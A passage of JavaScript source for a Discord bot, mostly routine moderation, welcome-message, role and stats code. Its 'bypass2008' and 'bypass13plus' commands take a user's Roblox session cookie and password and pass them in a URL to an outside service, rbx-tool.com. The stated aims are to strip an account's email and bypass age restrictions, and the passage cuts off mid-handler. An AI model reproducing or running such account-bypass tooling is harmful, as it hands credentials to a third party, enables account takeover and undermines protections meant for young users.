            { name: 'profilelookup', value: 'profilelookup' },
            { name: 'help', value: 'help' },
            { name: 'botstats', value: 'botstats' },
            { name: 'stats', value: 'stats' },
            { name: 'embedcreate', value: 'embedcreate' },
            { name: 'embedupdate', value: 'embedupdate' }
          )
      )
      .addChannelOption(option =>
        option.setName('channel')
          .setDescription('Channel to remove the command from (leave empty to remove from all)')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
      .setName('embedcreate')
      .setDescription('Create a custom embed message with clickable buttons (Admin/Owner only)')
      .addChannelOption(option =>
        option.setName('channel')
          .setDescription('Channel to send the embed to')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('title')
          .setDescription('Embed title')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('description')
          .setDescription('Embed description')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('color')
          .setDescription('Embed color (hex code like #FF0000 or color name)')
          .setRequired(false)
      )
      .addStringOption(option =>
        option.setName('thumbnail')
          .setDescription('Thumbnail image URL')
          .setRequired(false)
      )
      .addStringOption(option =>
        option.setName('image')
          .setDescription('Main image URL')
          .setRequired(false)
      )
      .addStringOption(option =>
        option.setName('footer')
          .setDescription('Footer text')
          .setRequired(false)
      )
      .addBooleanOption(option =>
        option.setName('timestamp')
          .setDescription('Add current timestamp to embed')
          .setRequired(false)
      )
      .addStringOption(option =>
        option.setName('buttons')
          .setDescription('Buttons: "Label,URL" or "<a:emoji:id> Label,URL" separated by | (max 5 buttons)')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
      .setName('stats')
      .setDescription('Show user command statistics')
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to check stats for (leave empty for yourself)')
          .setRequired(false)
      ),
    new SlashCommandBuilder()
      .setName('setwelcome')
      .setDescription('Set welcome message and channel (Admin/Owner only)')
      .addChannelOption(option =>
        option.setName('channel')
          .setDescription('Channel to send welcome messages')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('message')
          .setDescription('Welcome message (use {user} for mention, {username} for name, {server} for server name)')
          .setRequired(false)
      )
      .addStringOption(option =>
        option.setName('mode')
          .setDescription('Set mode for multiple messages')
          .setRequired(false)
          .addChoices(
            { name: 'Single - Set one message', value: 'single' },
            { name: 'Add - Add to rotation', value: 'add' },
            { name: 'List - Show all messages', value: 'list' },
            { name: 'Clear - Clear all messages', value: 'clear' }
          )
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
      .setName('setleave')
      .setDescription('Set leave message and channel (Admin/Owner only)')
      .addChannelOption(option =>
        option.setName('channel')
          .setDescription('Channel to send leave messages')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('message')
          .setDescription('Leave message (use {username} for name, {server} for server name)')
          .setRequired(false)
      )
      .addStringOption(option =>
        option.setName('mode')
          .setDescription('Set mode for multiple messages')
          .setRequired(false)
          .addChoices(
            { name: 'Single - Set one message', value: 'single' },
            { name: 'Add - Add to rotation', value: 'add' },
            { name: 'List - Show all messages', value: 'list' },
            { name: 'Clear - Clear all messages', value: 'clear' }
          )
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
      .setName('automod')
      .setDescription('Configure auto-moderation settings (Admin/Owner only)')
      .addStringOption(option =>
        option.setName('setting')
          .setDescription('Auto-mod setting to configure')
          .setRequired(true)
          .addChoices(
            { name: 'Enable Link Filter', value: 'link_on' },
            { name: 'Disable Link Filter', value: 'link_off' },
            { name: 'Enable Bad Word Filter', value: 'word_on' },
            { name: 'Disable Bad Word Filter', value: 'word_off' },
            { name: 'Add Bad Word', value: 'add_word' },
            { name: 'Remove Bad Word', value: 'remove_word' },
            { name: 'List Bad Words', value: 'list_words' },
            { name: 'Show Settings', value: 'show' }
          )
      )
      .addStringOption(option =>
        option.setName('word')
          .setDescription('Word to add or remove (required for add_word/remove_word)')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
      .setName('addrole')
      .setDescription('Add a role to a specific user or all members (Admin/Owner only)')
      .addStringOption(option =>
        option.setName('mode')
          .setDescription('Add role to specific user or all members')
          .setRequired(true)
          .addChoices(
            { name: 'Specific User', value: 'user' },
            { name: 'All Members', value: 'all' }
          )
      )
      .addRoleOption(option =>
        option.setName('role')
          .setDescription('Role to add')
          .setRequired(true)
      )
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to add role to (required for specific user mode)')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
      .setName('autorole')
      .setDescription('Configure automatic role assignment when users join (Admin/Owner only)')
      .addStringOption(option =>
        option.setName('mode')
          .setDescription('Configuration mode')
          .setRequired(true)
          .addChoices(
            { name: 'Set - Set auto role for new members', value: 'set' },
            { name: 'Remove - Remove auto role', value: 'remove' },
            { name: 'Status - Show current auto role', value: 'status' }
          )
      )
      .addRoleOption(option =>
        option.setName('role')
          .setDescription('Role to automatically assign (required for set mode)')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
      .setName('removerole')
      .setDescription('Remove a role from a specific user or all members (Admin/Owner only)')
      .addStringOption(option =>
        option.setName('mode')
          .setDescription('Remove role from specific user or all members')
          .setRequired(true)
          .addChoices(
            { name: 'Specific User', value: 'user' },
            { name: 'All Members', value: 'all' }
          )
      )
      .addRoleOption(option =>
        option.setName('role')
          .setDescription('Role to remove')
          .setRequired(true)
      )
      .addUserOption(option =>
        option.setName('user')
          .setDescription('User to remove role from (required for specific user mode)')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
      .setName('restrictchannel')
      .setDescription('Toggle channel restriction (commands only) for a channel (Admin/Owner only)')
      .addChannelOption(option =>
        option.setName('channel')
          .setDescription('Channel to restrict/unrestrict')
          .setRequired(true)
      )
      .addStringOption(option =>
        option.setName('action')
          .setDescription('Action to perform')
          .setRequired(true)
          .addChoices(
            { name: 'Restrict - Make channel commands only', value: 'restrict' },
            { name: 'Unrestrict - Allow normal messages', value: 'unrestrict' },
            { name: 'Status - Check current status', value: 'status' }
          )
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    new SlashCommandBuilder()
      .setName('embedupdate')
      .setDescription('Update an existing embed message (Admin/Owner only)')
      .addStringOption(option =>
        option.setName('embed_id')
          .setDescription('ID of the embed to update')
          .setRequired(true)
      )
      .addChannelOption(option =>
        option.setName('channel')
          .setDescription('Channel to send updated embed to (optional, uses original if not provided)')
          .setRequired(false)
      )
      .addStringOption(option =>
        option.setName('title')
          .setDescription('New embed title (leave empty to keep current)')
          .setRequired(false)
      )
      .addStringOption(option =>
        option.setName('description')
          .setDescription('New embed description (leave empty to keep current)')
          .setRequired(false)
      )
      .addStringOption(option =>
        option.setName('color')
          .setDescription('New embed color (hex code like #FF0000 or color name)')
          .setRequired(false)
      )
      .addStringOption(option =>
        option.setName('thumbnail')
          .setDescription('New thumbnail image URL')
          .setRequired(false)
      )
      .addStringOption(option =>
        option.setName('image')
          .setDescription('New main image URL')
          .setRequired(false)
      )
      .addStringOption(option =>
        option.setName('footer')
          .setDescription('New footer text')
          .setRequired(false)
      )
      .addBooleanOption(option =>
        option.setName('timestamp')
          .setDescription('Add/remove current timestamp to embed')
          .setRequired(false)
      )
      .addStringOption(option =>
        option.setName('buttons')
          .setDescription('New buttons: "Label,URL" or "<a:emoji:id> Label,URL" separated by | (max 5 buttons)')
          .setRequired(false)
      )
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
    
  ].map(cmd => cmd.toJSON());

  const rest = new REST({ version: '10' }).setToken(process.env.BOT_TOKEN);
  try {
    await rest.put(
      Routes.applicationCommands(client.user.id),
      { body: commands }
    );
    console.log('<:yes:1393890949960306719> Slash commands registered');
  } catch (err) {
    console.error('<:no:1393890945929318542> Error registering commands:', err);
  }
});

// Admin activity logging function
async function logAdminActivity(type, data) {
  try {
    const activity = {
      type: type,
      timestamp: Date.now(),
      ...data
    };
    
    await db.ref('admin/activities').push(activity);
  } catch (error) {
    console.error('Error logging admin activity:', error);
  }
}

// Guild join event - auto-initialize settings when bot joins new server
client.on('guildCreate', async guild => {
  try {
    console.log(`Bot joined new guild: ${guild.name} (${guild.id})`);
    
    // Auto-initialize automod settings with defaults
    const defaultAutoModSettings = {
      linkFilter: true,
      badWordFilter: true,
      badWords: [...defaultBadWords]
    };
    
    await saveAutoModSettings(guild.id, defaultAutoModSettings);
    autoModSettings.set(guild.id, defaultAutoModSettings);
    
    console.log(`Auto-initialized automod settings for guild: ${guild.name}`);
    
    // Log admin activity
    logAdminActivity('join', {
      title: 'Bot Added to Server',
      description: `Bot was added to ${guild.name} (${guild.memberCount} members)`,
      serverId: guild.id,
      serverName: guild.name,
      memberCount: guild.memberCount,
      ownerId: guild.ownerId
    });
    
    // Initialize server stats
    await db.ref(`guilds/${guild.id}/stats`).set({
      joinedAt: Date.now(),
      totalCommands: 0,
      lastActivity: Date.now()
    });
    
  } catch (error) {
    console.error('Error auto-initializing settings for new guild:', error);
  }
});

// Guild leave event - log removal
client.on('guildDelete', async guild => {
  try {
    console.log(`Bot left guild: ${guild.name} (${guild.id})`);
    
    // Log admin activity
    logAdminActivity('leave', {
      title: 'Bot Removed from Server',
      description: `Bot was removed from ${guild.name}`,
      serverId: guild.id,
      serverName: guild.name
    });
    
    // Mark server as left in database
    await db.ref(`guilds/${guild.id}/leftAt`).set(Date.now());
    
  } catch (error) {
    console.error('Error logging guild leave:', error);
  }
});

// Guild member join event for welcome messages
client.on('guildMemberAdd', async member => {
  try {
    // Reload settings first to get latest data
    await reloadGuildSettings(member.guild.id);
    
    const settings = guildSettings.get(member.guild.id);
    if (!settings || !settings.welcomeChannel) return;

    const welcomeChannel = member.guild.channels.cache.get(settings.welcomeChannel);
    if (!welcomeChannel) return;

    // Track join date for stats
    if (!userStats.has(member.guild.id)) {
      userStats.set(member.guild.id, new Map());
    }
    const guildUserStats = userStats.get(member.guild.id);
    if (!guildUserStats.has(member.id)) {
      guildUserStats.set(member.id, {
        commands: {},
        lastUsed: null,
        joinDate: Date.now()
      });
    }

    // Check for auto role assignment
    const autoRoleId = autoRoleSettings.get(member.guild.id);
    if (autoRoleId) {
      try {
        const autoRole = member.guild.roles.cache.get(autoRoleId);
        if (autoRole) {
          // Check if bot can manage the role
          const botMember = member.guild.members.me;
          if (botMember && botMember.permissions.has(PermissionFlagsBits.ManageRoles) && 
              autoRole.position < botMember.roles.highest.position) {
            await member.roles.add(autoRole);
            console.log(`Auto-assigned role ${autoRole.name} to ${member.user.tag} in ${member.guild.name}`);
          } else {
            console.log(`Cannot auto-assign role ${autoRole.name} - insufficient permissions or role hierarchy`);
          }
        } else {
          console.log(`Auto role ${autoRoleId} not found, removing setting`);
          autoRoleSettings.delete(member.guild.id);
          await deleteAutoRoleSettings(member.guild.id);
        }
      } catch (error) {
        console.error('Error auto-assigning role:', error);
      }
    }

    // Get random welcome message from array or use default
    const welcomeMessages = settings.welcomeMessages || ['Welcome {user} to {server}! You are the {membercount} member!'];
    const randomWelcomeMessage = welcomeMessages[Math.floor(Math.random() * welcomeMessages.length)];

    const memberCountWithSuffix = getOrdinalSuffix(member.guild.memberCount);

    // Ensure we have proper user data
    const username = member.user.username || member.user.tag || 'Unknown User';
    const displayName = member.displayName || member.user.displayName || username;

    const formattedMessage = randomWelcomeMessage
      .replace(/{user}/g, `<@${member.id}>`)
      .replace(/{username}/g, username)
      .replace(/{displayname}/g, displayName)
      .replace(/{mention}/g, `<@${member.id}>`)
      .replace(/{server}/g, `**${member.guild.name}**`)
      .replace(/{membercount}/g, `**${memberCountWithSuffix}**`);

    const welcomeEmbed = new EmbedBuilder()
      .setColor(0x00ff88)
      .setDescription(formattedMessage)
      .setThumbnail(member.user.displayAvatarURL({ size: 128 }))
      .setTimestamp()
      .setFooter({
        text: `Welcome to ${member.guild.name}`,
        iconURL: member.guild.iconURL()
      });

    await welcomeChannel.send({ embeds: [welcomeEmbed] });
  } catch (error) {
    console.error('Error sending welcome message:', error);
  }
});

// Guild member leave event for leave messages
client.on('guildMemberRemove', async member => {
  try {
    // Reload settings first to get latest data
    await reloadGuildSettings(member.guild.id);
    
    const settings = guildSettings.get(member.guild.id);
    if (!settings || !settings.leaveChannel) return;

    const leaveChannel = member.guild.channels.cache.get(settings.leaveChannel);
    if (!leaveChannel) return;

    // Get random leave message from array or use default
    const leaveMessages = settings.leaveMessages || ['{username} has left {server}. We\'ll miss you! 👋'];
    const randomLeaveMessage = leaveMessages[Math.floor(Math.random() * leaveMessages.length)];

    // For leave messages, member count should be current count (after the member left)
    const memberCountWithSuffix = getOrdinalSuffix(member.guild.memberCount);

    // Ensure we have proper user data
    const username = member.user.username || member.user.tag || 'Unknown User';
    const displayName = member.displayName || member.user.displayName || username;

    const formattedMessage = randomLeaveMessage
      .replace(/{user}/g, `<@${member.id}>`)
      .replace(/{username}/g, username)
      .replace(/{displayname}/g, displayName)
      .replace(/{mention}/g, `<@${member.id}>`)
      .replace(/{server}/g, `**${member.guild.name}**`)
      .replace(/{membercount}/g, `**${memberCountWithSuffix}**`);

    const leaveEmbed = new EmbedBuilder()
      .setColor(0xff6b6b)
      .setDescription(formattedMessage)
      .setThumbnail(member.user.displayAvatarURL({ size: 128 }))
      .setTimestamp()
      .setFooter({
        text: `Goodbye from ${member.guild.name}`,
        iconURL: member.guild.iconURL()
      });

    await leaveChannel.send({ embeds: [leaveEmbed] });
  } catch (error) {
    console.error('Error sending leave message:', error);
  }
});

client.on('messageCreate', async message => {
  // Auto-moderation system
  if (!message.author.bot && message.guild) {
    // Reload settings to get latest automod and restriction data
    await reloadGuildSettings(message.guild.id);
    
    const autoMod = autoModSettings.get(message.guild.id);
    if (autoMod) {
      let shouldDelete = false;
      let reason = '';

      // Check if user is owner, admin, or bot owner - they bypass ALL auto-moderation
      const isOwnerOrAdmin = message.guild.ownerId === message.author.id || 
                            isBotOwner(message.author.id) ||
                            (message.member && (
                              message.member.permissions.has(PermissionFlagsBits.Administrator) ||
                              message.member.permissions.has(PermissionFlagsBits.ModerateMembers)
                            ));

      // Skip auto-moderation for owners and admins
      if (isOwnerOrAdmin) {
        console.log(`User ${message.author.tag} bypassed auto-moderation as owner/admin in ${message.guild.name}`);
        // Continue without auto-moderation checks
      } else {
        // Check for links (only for regular users)
        if (autoMod.linkFilter && containsLink(message.content)) {
          shouldDelete = true;
          reason = 'Link detected';
        }

        // Check for bad words (only for regular users)
        if (autoMod.badWordFilter && containsBadWords(message.content, autoMod.badWords)) {
          shouldDelete = true;
          reason = 'Inappropriate content detected';
        }
      }

      if (shouldDelete) {
        try {
          await message.delete();
          
          const warningEmbed = new EmbedBuilder()
            .setColor(0xff6b6b)
            .setTitle('Auto-Moderation')
            .setDescription(`<@${message.author.id}> Your message was automatically deleted.`)
            .addFields(
              { name: 'Reason', value: reason, inline: true },
              { name: 'Channel', value: `<#${message.channel.id}>`, inline: true }
            )
            .setTimestamp()
            .setFooter({
              text: `User ID: ${message.author.id}`,
              iconURL: message.author.displayAvatarURL()
            });

          const warningMsg = await message.channel.send({ embeds: [warningEmbed] });
          
          // Auto-delete warning after 5 seconds
          setTimeout(async () => {
            try {
              await warningMsg.delete();
            } catch (error) {
              console.error('Error deleting auto-mod warning:', error);
            }
          }, 5000);

        } catch (error) {
          console.error('Error in auto-moderation:', error);
        }
        return; // Don't process the message further
      }
    }
  }

  // Handle auto-reply in specific channel
  if (message.channelId === '1393907304327413851') {
    // Ignore messages from bots (including this bot)
    if (message.author.bot) return;

    // Ignore system messages and slash commands
    if (message.system || message.interaction) return;

    // Check auto-reply cooldown per user
    const userCooldown = autoReplyCooldowns.get(message.author.id);
    if (userCooldown && Date.now() - userCooldown < AUTO_REPLY_COOLDOWN) {
      console.log(`Auto-reply cooldown active for user: ${message.author.username}`);
      return; // Skip reply if user is on cooldown
    }

    try {
      // Set cooldown for this user
      autoReplyCooldowns.set(message.author.id, Date.now());

      // Start typing indicator
      await message.channel.sendTyping();

      // Get ChatGPT roast response with conversation memory
      const roastMessage = await getChatGPTReply(message.content, message.author.username, message.author.id);

      // Add 2-second delay before replying
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Send the roast reply
      await message.reply(roastMessage);
    } catch (error) {
      console.error('Error sending auto-reply:', error);
    }
    return;
  }

  // Check if channel is restricted
  const guildRestrictedChannels = restrictedChannels.get(message.guild.id);
  if (guildRestrictedChannels && guildRestrictedChannels.has(message.channelId)) {
    // Ignore messages from bots and system messages
    if (message.author.bot || message.system || message.interaction) return;

    // Check if user is owner, admin, or bot owner - they bypass ALL restrictions
    const isOwnerOrAdmin = message.guild.ownerId === message.author.id || 
                          isBotOwner(message.author.id) ||
                          (message.member && message.member.permissions.has(PermissionFlagsBits.Administrator));

    // Allow server owner, bot owner, and administrators to send ANY messages without restriction
    if (isOwnerOrAdmin) {
      console.log(`User ${message.author.tag} bypassed channel restriction as owner/admin in ${message.guild.name}`);
      return; // Let the message through without any restrictions
    }

    // Allow prefix commands for regular users
    if (message.content.startsWith('!')) {
      const args = message.content.slice(1).trim().split(/ +/);
      const command = args.shift().toLowerCase();

      // Moderation commands require owner/admin permissions
      if (['ban', 'kick', 'mute', 'unmute', 'warn'].includes(command)) {
        return message.reply('<:no:1393890945929318542> Only server owners and administrators can use moderation commands.');
      }

      // Handle !stats command for regular users
      if (command === 'stats') {
        commandStats.stats++;
        trackUserCommand(message.guild.id, message.author.id, 'stats');

        let targetUser = message.author;
        
        // Check if a user was mentioned
        if (args.length > 0 && message.mentions.users.size > 0) {
          targetUser = message.mentions.users.first();
        }

        // Get user stats from the database
        const guildUserStats = userStats.get(message.guild.id);
        if (!guildUserStats || !guildUserStats.has(targetUser.id)) {
          return message.reply(`<:no:1393890945929318542> No command usage data found for ${targetUser === message.author ? 'you' : targetUser.username}.`);
        }

        const userData = guildUserStats.get(targetUser.id);
        const totalCommands = Object.values(userData.commands).reduce((a, b) => a + b, 0);
        
        // Get member to check join date
        let joinDate = userData.joinDate;
        try {
          const member = await message.guild.members.fetch(targetUser.id);
          joinDate = member.joinedTimestamp;
        } catch (error) {
          // Use stored join date if member fetch fails
        }

        // Sort commands by usage
        const sortedCommands = Object.entries(userData.commands)
          .sort(([,a], [,b]) => b - a)
          .slice(0, 10); // Top 10 commands

        const embed = new EmbedBuilder()
          .setColor(0x0ea5e9)
          .setTitle(`📊 ${targetUser === message.author ? 'Your' : `${targetUser.username}'s`} Command Statistics`)
          .setDescription(`Statistical overview for ${targetUser.tag}`)
          .setThumbnail(targetUser.displayAvatarURL())
          .addFields(
            { name: 'Total Commands Used', value: `${totalCommands}`, inline: true },
            { name: 'Last Command Used', value: userData.lastUsed ? `<t:${Math.floor(userData.lastUsed / 1000)}:R>` : 'Never', inline: true },
            { name: 'Joined Server', value: `<t:${Math.floor(joinDate / 1000)}:F>`, inline: true }
          )
          .setTimestamp()
          .setFooter({
            text: `Requested by ${message.author.tag}`,
            iconURL: message.author.displayAvatarURL()
          });

        if (sortedCommands.length > 0) {
          const commandList = sortedCommands
            .map(([cmd, count]) => `\`/${cmd}\` - ${count} time${count > 1 ? 's' : ''}`)
            .join('\n');
          
          embed.addFields({
            name: 'Most Used Commands',
            value: commandList,
            inline: false
          });
        } else {
          embed.addFields({
            name: 'Most Used Commands',
            value: 'No commands used yet',
            inline: false
          });
        }

        const reply = await message.reply({ embeds: [embed] });

        // Auto-delete after 10 seconds
        setTimeout(async () => {
          try {
            await reply.delete();
          } catch (error) {
            console.error('Error deleting stats message:', error);
          }
        }, 10000);
        return;
      }
      
      // For other prefix commands, allow them to continue
      return;
    }

    // Delete non-command messages from regular users and send warning
    try {
      await message.delete();

      const warningEmbed = new EmbedBuilder()
        .setColor(0xff6b6b)
        .setTitle('Restricted Channel')
        .setDescription(`<@${message.author.id}> This channel is restricted to commands only.`)
        .addFields(
          { name: 'Allowed', value: 'Slash commands and prefix commands (!ban, !kick, etc.)', inline: true },
          { name: 'Blocked', value: 'Regular text, links, and media', inline: true },
          { name: 'Note', value: 'Server owners and administrators can bypass this restriction', inline: false }
        )
        .setTimestamp()
        .setFooter({
          text: `User ID: ${message.author.id}`,
          iconURL: message.author.displayAvatarURL()
        });

      const warningMsg = await message.channel.send({ embeds: [warningEmbed] });
      
      // Auto-delete warning after 5 seconds
      setTimeout(async () => {
        try {
          await warningMsg.delete();
        } catch (error) {
          console.error('Error deleting restriction warning:', error);
        }
      }, 5000);

    } catch (error) {
      console.error('Error handling restricted channel message:', error);
    }
    return;
  }

  // Ignore messages from bots (including this bot)
  if (message.author.bot) return;

  // Ignore system messages and slash commands
  if (message.system || message.interaction) return;

  // Check for prefix commands
  if (message.content.startsWith('!')) {
    const args = message.content.slice(1).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // Check if user is owner, admin, or bot owner
    const isOwnerOrAdmin = message.guild.ownerId === message.author.id || 
                          isBotOwner(message.author.id) ||
                          (message.member && message.member.permissions.has(PermissionFlagsBits.Administrator));

    if (['ban', 'kick', 'mute', 'unmute', 'warn'].includes(command)) {
      if (!isOwnerOrAdmin) {
        return message.reply('<:no:1393890945929318542> Only server owners and administrators can use moderation commands.');
      }

      // Handle prefix moderation commands
      await handlePrefixModerationCommand(message, command, args);
      return;
    }

    // Handle !stats command
    if (command === 'stats') {
      commandStats.stats++;
      trackUserCommand(message.guild.id, message.author.id, 'stats');

      let targetUser = message.author;
      
      // Check if a user was mentioned
      if (args.length > 0 && message.mentions.users.size > 0) {
        targetUser = message.mentions.users.first();
      }

      // Get user stats from the database
      const guildUserStats = userStats.get(message.guild.id);
      if (!guildUserStats || !guildUserStats.has(targetUser.id)) {
        return message.reply(`<:no:1393890945929318542> No command usage data found for ${targetUser === message.author ? 'you' : targetUser.username}.`);
      }

      const userData = guildUserStats.get(targetUser.id);
      const totalCommands = Object.values(userData.commands).reduce((a, b) => a + b, 0);
      
      // Get member to check join date
      let joinDate = userData.joinDate;
      try {
        const member = await message.guild.members.fetch(targetUser.id);
        joinDate = member.joinedTimestamp;
      } catch (error) {
        // Use stored join date if member fetch fails
      }

      // Sort commands by usage
      const sortedCommands = Object.entries(userData.commands)
        .sort(([,a], [,b]) => b - a)
        .slice(0, 10); // Top 10 commands

      const embed = new EmbedBuilder()
        .setColor(0x0ea5e9)
        .setTitle(`${targetUser === message.author ? 'Your' : `${targetUser.username}'s`} Command Statistics`)
        .setDescription(`Statistical overview for ${targetUser.tag}`)
        .setThumbnail(targetUser.displayAvatarURL())
        .addFields(
          { name: 'Total Commands Used', value: `${totalCommands}`, inline: true },
          { name: 'Last Command Used', value: userData.lastUsed ? `<t:${Math.floor(userData.lastUsed / 1000)}:R>` : 'Never', inline: true },
          { name: 'Joined Server', value: `<t:${Math.floor(joinDate / 1000)}:F>`, inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Requested by ${message.author.tag}`,
          iconURL: message.author.displayAvatarURL()
        });

      if (sortedCommands.length > 0) {
        const commandList = sortedCommands
          .map(([cmd, count]) => `\`${cmd}\` - ${count} time${count > 1 ? 's' : ''}`)
          .join('\n');
        
        embed.addFields({
          name: 'Most Used Commands',
          value: commandList,
          inline: false
        });
      } else {
        embed.addFields({
          name: 'Most Used Commands',
          value: 'No commands used yet',
          inline: false
        });
      }

      const reply = await message.reply({ embeds: [embed] });

      // Auto-delete after 10 seconds
      setTimeout(async () => {
        try {
          await reply.delete();
        } catch (error) {
          console.error('Error deleting stats message:', error);
        }
      }, 10000);
      return;
    }
  }
});

// Restricted channels (guildId -> Set of channelIds)
const restrictedChannels = new Map();



// Helper function to reload settings from Firebase
async function reloadGuildSettings(guildId) {
  try {
    const [settingsData, automodData, autoRoleData, commandAssignmentsData, restrictedChannelsData] = await Promise.all([
      getGuildSettings(guildId),
      getAutoModSettings(guildId),
      getAutoRoleSettings(guildId),
      getCommandAssignments(guildId),
      getRestrictedChannels(guildId)
    ]);

    // Update local maps
    if (settingsData && Object.keys(settingsData).length > 0) {
      guildSettings.set(guildId, settingsData);
    }
    
    if (automodData) {
      autoModSettings.set(guildId, automodData);
    }
    
    if (autoRoleData) {
      autoRoleSettings.set(guildId, autoRoleData);
    } else {
      autoRoleSettings.delete(guildId);
    }
    
    if (commandAssignmentsData && Object.keys(commandAssignmentsData).length > 0) {
      commandChannelAssignments.set(guildId, commandAssignmentsData);
    }
    
    if (restrictedChannelsData && Array.isArray(restrictedChannelsData) && restrictedChannelsData.length > 0) {
      restrictedChannels.set(guildId, new Set(restrictedChannelsData));
    }

    console.log(`Reloaded settings for guild ${guildId}`);
  } catch (error) {
    console.error(`Error reloading settings for guild ${guildId}:`, error);
  }
}

client.on('interactionCreate', async interaction => {
  if (!interaction.isChatInputCommand()) return;

  const { commandName, user } = interaction;

  // Reload guild settings before processing commands to ensure we have latest data
  await reloadGuildSettings(interaction.guild.id);

  // Allow commandassign and removecommand to be used anywhere by bot/server owners
  if (commandName === 'commandassign' || commandName === 'removecommand') {
    const isOwnerOrBotOwner = interaction.guild.ownerId === interaction.user.id || isBotOwner(interaction.user.id);
    
    if (!isOwnerOrBotOwner) {
      return interaction.reply({
        content: '<:no:1393890945929318542> Only bot owners and server owners can use this command.',
        ephemeral: true
      });
    }
  } else {
    // Check if command can be used in current channel
    const canUseHere = canUseCommandInChannel(interaction.guild.id, interaction.channelId, commandName, interaction.user.id, interaction.member);
    
    if (!canUseHere) {
      const guildAssignments = commandChannelAssignments.get(interaction.guild.id);
      const assignedChannels = guildAssignments?.[commandName];
      let channelMention = 'the designated channel(s)';
      
      if (assignedChannels && assignedChannels.length > 0) {
        if (assignedChannels.length === 1) {
          channelMention = `<#${assignedChannels[0]}>`;
        } else {
          channelMention = assignedChannels.map(id => `<#${id}>`).join(', ');
        }
      }
      
      return interaction.reply({
        content: `<:no:1393890945929318542> You can only use this command in ${channelMention}.`,
        ephemeral: true
      });
    }
  }

  // Check cooldown for main commands (not help/botstats)
  if (['bypass2008', 'bypass13plus', 'refreshcookie', 'validatecookie', 'cookieexpiry', 'profilelookup', 'ban', 'kick', 'mute', 'unmute', 'warn'].includes(commandName)) {
    const userCooldown = cooldowns.get(user.id);
    if (userCooldown && Date.now() - userCooldown < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (Date.now() - userCooldown)) / 1000);
      return interaction.reply({
        content: `Please wait ${remainingTime} seconds before using this command again.`,
        ephemeral: true
      });
    }
    cooldowns.set(user.id, Date.now());
  }

  // Update command stats and track user usage
  if (commandStats[commandName] !== undefined) {
    commandStats[commandName]++;
    trackUserCommand(interaction.guild.id, interaction.user.id, commandName);
    
    // Log activity for admin monitoring
    logAdminActivity('command', {
      title: 'Command Used',
      description: `${interaction.user.username} used /${commandName} in ${interaction.guild.name}`,
      serverId: interaction.guild.id,
      serverName: interaction.guild.name,
      userId: interaction.user.id,
      username: interaction.user.username,
      command: commandName
    });
  }

  if (interaction.commandName === 'bypass2008') {
    const cookie = interaction.options.getString('cookie');

    await interaction.reply({ content: '<:yes:1393890949960306719> Processing bypass request...', ephemeral: true });

    try {
      const res = await fetch(`https://rbx-tool.com/apis/bypassAge?a=${encodeURIComponent(cookie)}`, {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json'
        }
      });

      if (!res.ok) {
        throw new Error(`HTTP ${res.status}: ${res.statusText}`);
      }

      const data = await res.json();

      const embed = new EmbedBuilder()
        .setColor(data.status === "success" ? 0x00ff88 : 0xff4757)
        .setTitle("Email Bypass (2008 Method)")
        .setDescription("Bypass results from INC BOT")
        .addFields(
          { name: "Bypass Result", value: data.message || (data.status === "success" ? "Success removing email!" : "Unknown error"), inline: false },
          { name: "Status", value: data.status === "success" ? "<:yes:1393890949960306719> Completed" : "<:no:1393890945929318542> Failed", inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag} • Roblox Tools`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    } catch (error) {
      console.error('Bypass2008 error:', error);
      
      const embed = new EmbedBuilder()
        .setColor(0xfacc15)
        .setTitle("Email Bypass (2008 Method)")
        .setDescription("Bypass request failed")
        .addFields(
          { name: "Bypass Result", value: `<:no:1393890945929318542> **API Error:** ${error.message}`, inline: false },
          { name: "Status", value: "<:no:1393890945929318542> API Unavailable", inline: true }
        )
        .setTimestamp()
        .setFooter({
          text: `Requested by ${interaction.user.tag} • Roblox Tools`,
          iconURL: interaction.user.displayAvatarURL()
        });

      await interaction.followUp({ embeds: [embed] });
    }
  }

  if (interaction.commandName === 'bypass13plus') {
    const cookie = interaction.options.getString('cookie');
    const password = interaction.options.getString('password');

    await interaction.reply({ content: '<:yes:1393890949960306719> Processing bypass request...', ephemeral: true });

    try {
      const res = await fetch(`https://rbx-tool.com/apis/bypassAgeV2?a=${encodeURIComponent(cookie)}&b=${encodeURIComponent(password)}`, {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json'
        }
      });

      if (!res.ok) {
        throw new Error(`HTTP ${res.status}: ${res.statusText}`);
      }

      const data = await res.json();

      const embed = new EmbedBuilder()
        .setColor(data.status === "success" ? 0x00ff88 : 0xff4757)
        .setTitle("Age Bypass (13+ to Under 13)")
        .setDescription("Bypass results from INC BOT")
        .addFields(
